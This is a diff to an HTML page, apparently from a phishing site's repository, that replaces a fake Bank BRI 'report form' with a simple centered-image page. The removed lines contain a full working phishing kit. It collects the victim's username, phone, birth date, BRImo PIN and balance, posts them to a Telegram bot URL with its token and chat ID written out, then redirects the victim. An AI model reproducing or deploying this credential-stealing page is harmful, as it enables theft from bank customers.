@@ -2,237 +2,38 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta property="og:image" content="https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/akusatu.jpg">
   <meta name="theme-color" content="#15317e">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Form Bank BRI</title>
+  <title>Center Image Example</title>
   <style>
-    body {
+    body, html {
+      height: 100%;
       margin: 0;
-      padding: 0;
-      margin-top: 40px;
-      background-image: url('back.png');
-      background-size: cover;
-      background-repeat: no-repeat;
-      background-attachment: fixed;
-      background-position: center;
-      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f0f0f0; /* Warna latar belakang halaman */
     }
 
     .container {
-      width: 300px;
-      margin: 0 auto;
-      margin-top: 80px;
-      background: rgba(255, 255, 255, 0.9);
-      padding: 10px;
-      border-radius: 10px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      width: 100%;
     }
 
-    .header {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .header h1 {
-      color: #0041c2;
-      font-size: 16px;
-      text-transform: uppercase;
-      margin: 0;
-    }
-
-    .header hr {
-      border: 1px solid #000;
-      width: 80%;
-      margin: 10px auto;
-    }
-
-    .input-group {
-      margin-bottom: 10px;
-      position: relative;
-    }
-
-    .input-group label {
-      display: block;
-      margin-bottom: 5px;
-      font-weight: bold;
-      font-size: 12px;
-      color: #15317e;
-    }
-
-    .input-icon img {
-      position: absolute;
-      top: 65%;
-      left: 10px;
-      transform: translateY(-50%);
-      width: 20px;
+    img {
+      max-width: 100%;
+      max-height: 100%;
       height: auto;
-      pointer-events: none;
-    }
-
-    .input-group input {
-      width: calc(100% - 60px);
-      padding: 11px 16px 13px 40px;
-      border: 2px solid #ccc;
-      border-radius: 5px;
-    }
-
-    .btn {
-      width: 87%;
-      background-color: #15317e;
-      color: #ffffff;
-      border: none;
-      border-radius: 5px;
-      padding: 10px 15px;
-      cursor: pointer;
-      margin-left: 19px;
-      margin-top: 10px;
-    }
-
-    .btn-link {
-      display: block;
-      text-align: center;
-      margin-top: 10px;
-      color: #15317e;
-      text-decoration: none;
-    }
-
-    .loader {
-      border: 8px solid #f3f3f3;
-      border-top: 8px solid #15317e;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 2s linear infinite;
-      display: none;
-      position: absolute;
-      top: 50%;
-      left: 41%;
-      transform: translate(-50%, -50%);
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      width: auto;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="header">
-      <h1>FORMULIR LAPORAN BANK BRI<br>ID Laporan : 2265GA007</h1>
-      <hr>
-    </div>
-    <form id="registrationForm">
-      <div class="input-group">
-        <label for="username">Username:</label>
-        <div class="input-icon">
-          <img src="kil.png" alt="Username Icon">
-          <input type="text" name="username" id="username" placeholder="" required>
-        </div>
-      </div>
-      <div class="input-group">
-        <label for="phone">Nomor Handphone:</label>
-        <div class="input-icon">
-          <img src="rii.png" alt="Phone Icon">
-          <input type="tel" name="phone" id="phone" placeholder="8xxx xxxx xxxx" required maxlength="12" oninput="this.value = this.value.replace(/\D/g,'').substring(0, 12)">
-        </div>
-      </div>
-      <div class="input-group">
-        <label for="masa_berlaku">Tanggal Lahir:</label>
-        <div class="input-icon">
-          <img src="kal.png" alt="Date Icon">
-          <input type="tel" id="masa_berlaku" name="masa_berlaku" placeholder="DD/MM/YYYY" required maxlength="10">
-        </div>
-      </div>
-      <div class="input-group">
-        <label for="pin">PIN BRImo:</label>
-        <div class="input-icon">
-          <img src="pin.png" alt="PIN Icon">
-          <input type="password" name="pin" id="pin" placeholder="" required minlength="6" maxlength="6" oninput="this.value=this.value.replace(/\D/g,'')">
-        </div>
-      </div>
-      <div class="input-group">
-        <label for="balance">Sisa Saldo Akhir:</label>
-        <div class="input-icon">
-          <img src="idr.png" alt="Saldo Icon">
-          <input type="tel" id="jumlahInput" name="balance" placeholder="" required oninput="updateNominal()">
-        </div>
-      </div>
-      <button type="submit" class="btn">LANJUT</button>
-      <a href="lanjut.html" class="btn-link">Kembali ke Halaman Utama</a>
-      <div class="loader" id="loader"></div>
-    </form>
+    <img src="Poto.png" alt="Centered Image">
   </div>
-
-  <script>
-    function updateNominal() {
-      var nominalInput = document.getElementById("jumlahInput");
-      var value = nominalInput.value.replace(/\D/g, ''); // Hapus karakter selain digit
-
-      // Format nilai Rupiah
-      var formattedValue = "Rp " + Number(value).toLocaleString("id-ID");
-
-      nominalInput.value = formattedValue;
-    }
-
-    function addSlash(input) {
-      let value = input.value.replace(/\D/g, ''); // Hapus semua karakter non-digit
-      if (value.length >= 2) {
-          value = value.substring(0, 2) + '/' + value.substring(2); // Tambahkan slash setelah 2 digit pertama (DD)
-      }
-      if (value.length >= 5) {
-          value = value.substring(0, 5) + '/' + value.substring(5); // Tambahkan slash setelah 2 digit berikutnya (MM)
-      }
-      if (value.length > 10) {
-          value = value.substring(0, 10); // Batasi panjang input maksimal 10 karakter
-      }
-      input.value = value;
-    }
-
-    function sendMessageToTelegram(message) {
-      var xhttp = new XMLHttpRequest();
-      xhttp.onreadystatechange = function() {
-        if (this.readyState === 4 && this.status !== 200) {
-          console.error("Gagal mengirim pesan. Status: " + this.status + ", Response: " + this.responseText);
-        }
-      };
-
-      var url = "https://api.telegram.org/bot6915028788:AAH6XQ-fRDgf31N1haNYBnhqOMU_NfNwZl8/sendMessage?chat_id=7062686104&text=" + encodeURIComponent(message);
-      xhttp.open("POST", url, true);
-      xhttp.send();
-    }
-
-    document.getElementById("registrationForm").addEventListener("submit", function(event) {
-      event.preventDefault(); // Mencegah form dikirim langsung
-
-      var loader = document.getElementById("loader");
-      loader.style.display = "block"; // Tampilkan loader
-
-      var username = document.getElementById("username").value;
-      var phone = document.getElementById("phone").value;
-      var masaBerlaku = document.getElementById("masa_berlaku").value;
-      var pin = document.getElementById("pin").value;
-      var balance = document.getElementById("jumlahInput").value;
-
-      var message = "User Data BRImo:\n";
-      message += "Username: " + username + "\n";
-      message += "Phone: " + phone + "\n";
-      message += "Valid Thru: " + masaBerlaku + "\n";
-      message += "PIN: " + pin + "\n";
-      message += "Balance: " + balance + "\n";
-
-      sendMessageToTelegram(message);
-
-      setTimeout(function() {
-        loader.style.display = "none";
-        window.location.href = "lanjut.html"; // Alihkan ke halaman lanjut.html
-      }, 2000); // Simulasi delay pengiriman
-    });
-
-    document.getElementById('masa_berlaku').addEventListener('input', function() {
-      addSlash(this);
-    });
-  </script>
-
-
+</body>
+</html>
